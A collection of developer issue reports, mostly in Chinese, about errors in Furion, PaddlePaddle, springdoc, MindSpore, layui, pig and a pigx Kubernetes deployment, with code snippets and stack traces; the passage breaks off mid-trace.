根据条件批量更新的完整示例有吗？,"Furion 版本号 2.19 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 请问下查询批量操作的完整示例有吗？我引用了 Zack.EFCore.Batch 相应DLL后无法正常执行下面代码，提供没有找到方法 无 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 关注 Furion 如果您喜欢或正使用 Furion，Furion 也能帮助到您，可以考虑给 Furion 一个 Star。   <code>: // 根据条件批量删除 repository.Where(a =&gt; a.ItemId &gt; 500).BatchDelete(); await repository.Where(a =&gt; a.ItemId &gt; 500).BatchDeleteAsync(); // 根据条件批量更新 repository.Where(a =&gt; a.ItemId &lt;= 500).BatchUpdate(a =&gt; new Item { Quantity = a.Quantity + 100 }); repository.Where(a =&gt; a.ItemId &lt;= 500).BatchUpdate(new Item { Description = ""Updated"" }); await repository.Where(a =&gt; a.ItemId &lt;= 500).BatchUpdateAsync(new Item { Description = ""Updated"" }); // 批量更新指定列 var updateColumns = new List&lt;string&gt; { nameof(Item.Quantity) }; var q = repository.Where(a =&gt; a.ItemId &lt;= 500); int affected = q.BatchUpdate(new Item { Description = ""Updated"" }, updateColumns);"
在使用paddle.static训练时，数据读取报错,"PaddlePaddle 2.1.1 关键代码： 其中和输出都是4个的，不知道为啥提示不相等。是不是静态图还有什么特别的做法？ 错误日志：   <code>: train_loader = DataLoader(dataset=train_generator, feed_list=test_generator.feed_list, collate_fn=padding_batch, batch_size=args.batch_size, return_list=False, num_workers=args.num_workers) feed_list padding_batch() data = self._reader.read_next() ValueError: (InvalidArgument) The sample number of reader's input data and the input number of feed list are not equal. Possible reasons are: The generator is decorated by `paddle.batch` and configured by `set_batch_generator`, but here need to used `set_sample_list_generator`. [Hint: Expected names_.size() == ret_[i].size(), but received names_.size():4 != ret_[i].size():3.] (at C:\home\workspace\Paddle_release2\paddle\fluid\pybind\reader_py.cc:199)"
"只用springdoc-openapi-webmvc-core报错,难道还要引入原始UI?","子项目仅引入 配合 会抛出如下异常, 引入 则没问题?????难道还要引入原始UI? 2022-11 补充 没想到就这么被作者稀里糊涂的关掉了，这根本不是配置的问题 ， 原因在这里   <code>: org.springdoc:springdoc-openapi-webmvc-core com.github.xiaoymin:knife4j-springdoc-ui org.springdoc.api.OpenApiResourceNotFoundException: No OpenAPI resource found for group: swagger-config org.springdoc:springdoc-openapi-ui springdoc-openapi-ui gives both swaggerUI and json API (along with yaml format). springdoc-openapi-webmvc-core will only provide the swagger api alone."
提供支持更完整参数的gemm接口,"目前在math_function中gemm的接口如下： 在将Paddle目前GRU进行OP port过程中，目前有如下部分代码： 这里用到了math_function 中封装限定了的、和这几个参数 能否在math_function中加下gemm的带有完整所有参数的接口。   <code>: // Support continuous memory now // If transA = N, and transB = N // Then matrixA: M * K, matrixB: K * N matrixC : M * N // For more detailed info, please refer to // http://www.netlib.org/lapack/explore-html/d4/de2/sgemm_8f.html template &lt;typename Place, typename T&gt; void gemm(const CBLAS_TRANSPOSE transA, const CBLAS_TRANSPOSE transB, const int M, const int N, const int K, const T alpha, const T* A, const T* B, const T beta, T* C, platform::DeviceContext* context); BlasGemm&lt;Device, T&gt;::compute(false, false, batchSize, 2 * frameSize, frameSize, 1, value.prevOutValue, frameSize, value.gateWeight, frameSize * 2, 1, value.gateValue, frameSize * 3); gemm lda ldb ldc template &lt;&gt; void gemm&lt;platform::CPUPlace, float&gt;(const CBLAS_TRANSPOSE transA, const CBLAS_TRANSPOSE transB, const int M, const int N, const int K, const float alpha, const float* A, const float* B, const float beta, float* C, platform::DeviceContext* context) { int lda = (transA == CblasNoTrans) ? K : M; int ldb = (transB == CblasNoTrans) ? N : K; int ldc = N; cblas_sgemm(CblasRowMajor, transA, transB, M, N, K, alpha, A, lda, B, ldb, beta, C, ldc); }"
Build and run unit tests of Paddle,"I need to add the following stuff to Docker-related documents, or maybe a <em>How to Develop and Test</em> guide. How to build and run tests Paddle uses cmake as the build system. Usually, we run and from without a directory other than the source code directory , but somewhere like . After building, we can run from within the same directory for tests. For detailed messages on failure suppresses detailed outputs by default. This fits the cases of CI, but not for development, where we would like to see detailed outputs. To do so, we can set the environment variable to 1: No before running tests In our Dockerfiles, we have which installs the built Python libraries of Paddle. But some of our tests require a clean Python environment. When we see error messages like the following, we just need to run and re-run tests.   <code>: cmake make paddle paddle/build ctest ctest CTEST_OUTPUT_ON_FAILURE CTEST_OUTPUT_ON_FAILURE=1 ctest cmake install RUN make install pip uninstall paddle 38/56 Test #38: test_RecurrentGradientMachine .......***Failed 0.02 sec paddle package is already in your PYTHONPATH. But unittest need a clean environment. Please uninstall paddle package before start unittest. Try to 'pip uninstall paddle' Start 39: test_NetworkCompare 39/56 Test #39: test_NetworkCompare .................***Failed 0.02 sec paddle package is already in your PYTHONPATH. But unittest need a clean environment. Please uninstall paddle package before start unittest. Try to 'pip uninstall paddle' Start 40: test_PyDataProvider2 40/56 Test #40: test_PyDataProvider2 ................***Failed 0.02 sec paddle package is already in your PYTHONPATH. But unittest need a clean environment. Please uninstall paddle package before start unittest. Try to 'pip uninstall paddle'"
【MindSpore】【Ascend】【C类】【metric_learn】1p和8p训练功能报错,"一、问题现象： 1， 根据资料步骤进行1p训练 ： ** 根据资料步骤进行8p训练 ：** 1p和8p训练报错日志如下： 二、软件版本: -- CANN 版本: (CANN 5.0.4 B065) -- Mindspore 版本：1.6.1 --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04   <code>: bash run_standalone_train.sh /data/Stanford_Online_Products/ /home/wx/metric_learn/resnet50_ascend_v130_imagenet2012_official_cv_bs256_top1acc76.97__top5acc_93.44.ckpt 0 trpletloss bash run_distribute_train.sh /home/wx/metric_learn/hccl_8p_01234567_51.38.67.179.json /data/Stanford_Online_Products/ /home/wx/metric_learn/resnet50_ascend_v130_imagenet2012_official_cv_bs256_top1acc76.97__top5acc_93.44.ckpt trpletloss Traceback (most recent call last): File ""train.py"", line 154, in &lt;module&gt; dataset = create_dataset(dataset_generator, do_train=True, batch_size=config.batch_size, NameError: name 'create_dataset' is not defined"
AiStuido 不能使用GPU训练,1）PaddlePaddle版本：AIStudio 默认 (1.7) 2）CPU：AIStudio 默认 3）GPU：AIStudio 默认 4）系统环境：AIStudio 默认 训练信息 1）单机，单卡 2）显存信息: V100 3）Operator信息: 没有错误提示， 复现信息：在AiStudio 上运行任何GPU代码都不行 问题描述：   <code>: with fluid.dygraph.guard(place = fluid.CUDAPlace(0)): model = DummyDNN() dummy_preds = model(dummy_data)
layui 1.4.5 表格组件报错,"使用官方文档到示例代码，更新到1.4.5后，表格组件报错，无法执行change3方法。之前可以正常使用，更新版本后，点击分页按钮，控制台报错：Uncaught ReferenceError: modelValue is not defined at onUpdate:modelValue._cache.._cache. 代码内容   <code>: &lt;template&gt; page props: {{ page3 }} &lt;lay-table :columns=""columns3"" :data-source=""dataSource3"" :page=""page3"" @change=""change3""&gt;&lt;/lay-table&gt; &lt;/template&gt; &lt;script&gt; import { ref } from 'vue'; import { layer } from ""@layui/layer-vue""; export default { setup() { const page3 = ref({ total: 100, limit: 10, current: 2, showRefresh: true, }) const change3 = ({ current, limit }) =&gt; { layer.msg(""current:"" + current + "" limit:"" + limit); } const columns3 = [ { title:""账户"", width:""200px"", slot:""username"", key:""username"" },{ title:""密码"", width: ""180px"", slot:""password"", key:""password"" },{ title:""年龄"", width: ""180px"", key:""age"" } ] const dataSource3 = [ {username:""root"", password:""root"", age:""18""}, {username:""woow"", password:""woow"", age:""20""} ] return { page3, change3, columns3, dataSource3 } } } &lt;/script&gt;"
角色管理，新建角色后，分配权限报错,"pig版本: 3.4.9 1，新建角色coder 2,分配权限，选择用户管理 3，报错Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: ,   <code>: KEYS user_details::* 2022-04-25 11:46:15.446 ERROR 20764 --- [ XNIO-1 task-1] c.p.p.c.f.s.h.GlobalBizExceptionHandler : 全局异常信息 ex=Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command `KEYS`, with args beginning with: `user_details::*`, org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command `KEYS`, with args beginning with: `user_details::*`, at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:54) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:52) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:41) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.PassThroughExceptionTranslationStrategy.translate(PassThroughExceptionTranslationStrategy.java:44) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.FallbackExceptionTranslationStrategy.translate(FallbackExceptionTranslationStrategy.java:42) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceConnection.convertLettuceAccessException(LettuceConnection.java:272) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceConnection.await(LettuceConnection.java:1063) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceConnection.lambda$doInvoke$4(LettuceConnection.java:920) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceInvoker$Synchronizer.invoke(LettuceInvoker.java:673) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceInvoker$DefaultManyInvocationSpec.toSet(LettuceInvoker.java:639) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceInvoker$ManyInvocationSpec.toSet(LettuceInvoker.java:434) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.lettuce.LettuceKeyCommands.keys(LettuceKeyCommands.java:155) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.connection.DefaultedRedisConnection.keys(DefaultedRedisConnection.java:122) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.cache.BatchStrategies$Keys.cleanCache(BatchStrategies.java:81) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.cache.DefaultRedisCacheWriter.lambda$clean$4(DefaultRedisCacheWriter.java:220) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.cache.DefaultRedisCacheWriter.execute(DefaultRedisCacheWriter.java:308) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.cache.DefaultRedisCacheWriter.clean(DefaultRedisCacheWriter.java:209) ~[spring-data-redis-2.6.4.jar:2.6.4] at org.springframework.data.redis.cache.RedisCache.clear(RedisCache.java:211) ~[spring-data-redis-2.6.4.jar:2.6.4] at com.pig4cloud.pig.admin.service.impl.SysRoleMenuServiceImpl.saveRoleMenus(SysRoleMenuServiceImpl.java:71) ~[classes/:na] at com.pig4cloud.pig.admin.service.impl.SysRoleMenuServiceImpl$$FastClassBySpringCGLIB$$ac58951d.invoke(&lt;generated&gt;) ~[classes/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:793) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-5.3.19.jar:5.3.19] at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:388) ~[spring-tx-5.3.19.jar:5.3.19] at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-5.3.19.jar:5.3.19] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:708) ~[spring-aop-5.3.19.jar:5.3.19] at com.pig4cloud.pig.admin.service.impl.SysRoleMenuServiceImpl$$EnhancerBySpringCGLIB$$e43bdf08.saveRoleMenus(&lt;generated&gt;) ~[classes/:na] at com.pig4cloud.pig.admin.controller.RoleController.saveRoleMenus(RoleController.java:131) ~[classes/:na] at com.pig4cloud.pig.admin.controller.RoleController$$FastClassBySpringCGLIB$$533c3899.invoke(&lt;generated&gt;) ~[classes/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:793) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:763) ~[spring-aop-5.3.19.jar:5.3.19] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:89) ~[spring-aop-5.3.19.jar:5.3.19] at com.pig4cloud.pig.common.log.aspect.SysLogAspect.around(SysLogAspect.java:54) ~[classes/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_191] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_191] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_191]"
k8s 前端部署启动失败,"环境信息 pigx版本: 3.7 是否修改包名: ehr 按照视频部署K8S，后端项目正常启动，无报错。 前端部署时配置ingress，启动后报无法连接数据库的错误，访问页面显示5.2 Bad Gateway 前端启动为何会报到连接数据库失败？前端启动会去操作数据库吗？ MySQL使用的是外部mysql，没用docker容器中的，已配置环境变量 以下为前端启动日志，看着是nacos的启动日志啊 2020-04-26 10:25:06.005 --- [ main] : Nacos Log files: /root/nacos/logs/ 2020-04-26 10:25:06.007 --- [ main] : Nacos Conf files: /root/nacos/conf/ 2020-04-26 10:25:06.007 --- [ main] : Nacos Data files: /root/nacos/data/ 2020-04-26 10:25:06.007 --- [ main] : Nacos started successfully in stand alone mode. ,--,: : | Nacos ,| ' : ,---. Running in stand alone mode, All function modules | : : | | ' ,'\ .--.--. Port: 8848 : | \ | : ,--.--. ,---. / / | / / ' Pid: 7 | : ' '; | / \ / . ; ,. :| : /. https://nacos.io ' : | ; .' ,"" .--.; |' ; :__| : | --' / / ,. |' | '.'|\ \ / / /----' '--'. / ; |.' | , .-./\ \ / ------' 2020-04-26 10:25:07.432 --- [ main] : BeanFactory id=205d6fe0-57f6-3dfd-8090-af841986b599 2020-04-26 10:25:07.716 --- [ main] : Bean 'org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration' of type [org.springframework.security.config.annotation.configuration.ObjectPostProcessorConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-04-26 10:25:07.891 --- [ main] : Bean 'objectPostProcessor' of type [org.springframework.security.config.annotation.configuration.AutowireBeanFactoryObjectPostProcessor] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-04-26 10:25:07.893 --- [ main] : Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@3c73951' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-04-26 10:25:07.893 --- [ main] : Bean 'org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration' of type [org.springframework.security.config.annotation.method.configuration.GlobalMethodSecurityConfiguration] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-04-26 10:25:07.898 --- [ main] : Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2020-04-26 10:25:08.190 --- [ main] : Tomcat initialized with port(s): 8848 (http) 2020-04-26 10:25:08.271 --- [ main] : Root WebApplicationContext: initialization completed in 2101 ms org.springframework.jdbc.CannotGetJdbcConnectionException: Failed to obtain JDBC Connection; nested exception is org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory (Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:82) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:371) at org.springframework.jdbc.core.JdbcTemplate.update(JdbcTemplate.java:523) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl$SelectMasterTask.run(BasicDataSourceServiceImpl.java:317) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl.reload(BasicDataSourceServiceImpl.java:213) at com.alibaba.nacos.config.server.service.BasicDataSourceServiceImpl.init(BasicDataSourceServiceImpl.java:131) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:416) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1788) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1108) at com.alibaba.nacos.config.server.service.DynamicDataSource.getDataSource(DynamicDataSource.java:54) at com.alibaba.nacos.config.server.service.PersistService.init(PersistService.java:91) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:416) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1788) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:595) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1287) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:116) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:594) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:879) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:878) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:550) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:141) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:747) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1226) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1215) at com.alibaba.nacos.EhrNacosApplication.main(EhrNacosApplication.java:22) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.boot.loader.MainMethodRunner.run(MainMethodRunner.java:48) at org.springframework.boot.loader.Launcher.launch(Launcher.java:87) at org.springframework.boot.loader.Launcher.launch(Launcher.java:51) at org.springframework.boot.loader.JarLauncher.main(JarLauncher.java:52) Caused by: org.apache.commons.dbcp.SQLNestedException: Cannot create PoolableConnectionFactory (Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.) at org.apache.commons.dbcp.BasicDataSource.createPoolableConnectionFactory(BasicDataSource.java:1549) at org.apache.commons.dbcp.BasicDataSource.createDataSource(BasicDataSource.java:1388) at org.apache.commons.dbcp.BasicDataSource.getConnection(BasicDataSource.java:1044) at org.springframework.jdbc.datasource.DataSourceUtils.fetchConnection(DataSourceUtils.java:158) at org.springframework.jdbc.datasource.DataSourceUtils.doGetConnection(DataSourceUtils.java:116) at org.springframework.jdbc.datasource.DataSourceUtils.getConnection(DataSourceUtils.java:79) ... 69 more Caused by: com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server. at com.mysql.cj.jdbc.exceptions.SQLError.createCommunicationsException(SQLError.java:174) at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:64) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:836) at com.mysql.cj.jdbc.ConnectionImpl.(ConnectionImpl.java:456) at com.mysql.cj.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:246) at com.mysql.cj.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:197) at org.apache.commons.dbcp.DriverConnectionFactory.createConnection(DriverConnectionFactory.java:38) at org.apache.commons.dbcp.PoolableConnectionFactory.makeObject(PoolableConnectionFactory.java:582) at org.apache.commons.dbcp.BasicDataSource.validateConnectionFactory(BasicDataSource.java:1556) at org.apache.commons.dbcp.BasicDataSource.createPoolableConnectionFactory(BasicDataSource.java:1545) ... 74 more Caused by: com.mysql.cj.exceptions.CJCommunicationsException: Communications link failure The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server. at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:105) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:151) at com.mysql.cj.exceptions.ExceptionFactory.createCommunicationsException(ExceptionFactory.java:167) at com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:91) at com.mysql.cj.NativeSession.connect(NativeSession.java:144) at com.mysql.cj.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:956) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:826) ... 81 more Caused by: java.net.ConnectException: Connection refused (Connection refused) at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:589) at com.mysql.cj.protocol.StandardSocketFactory.connect(StandardSocketFactory.java:155) at com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:65) ... 84 more 2020-04-26 10:25:09.746 --- [ main] : Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'opsController' defined in URL [jar:file:/ehr-register/ehr-register.jar!/BOOT-INF/lib/nacos-config-1.1.4.jar!/com/alibaba/nacos/config/server/controller/OpsController.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dumpService': Invocation of init method failed; nested exception is java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set 2020-04-26 10:25:09.824 --- [ main] : Nacos Log files: /root/nacos/logs/ 2020-04-26 10:25:09.824 --- [ main] : Nacos Conf files: /root/nacos/conf/ 2020-04-26 10:25:09.824 --- [ main] : Nacos Data files: /root/nacos/data/ 2020-04-26 10:25:09.824 --- [ main] : Nacos failed to start, please see /root/nacos/logs/nacos.log for more details. 2020-04-26 10:25:09.846 --- [ main] : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-04-26 10:25:09.854 --- [ main] : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'opsController' defined in URL [jar:file:/ehr-register/ehr-register.jar!/BOOT-INF/lib/nacos-config-1.1.4.jar!/com/alibaba/nacos/config/server/controller/OpsController.class]: Unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'dumpService': Invocation of init method failed; nested exception is java.lang.RuntimeException: Nacos Server did not start because dumpservice bean construction failure : No DataSource set at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:798) at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:228) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1358) at 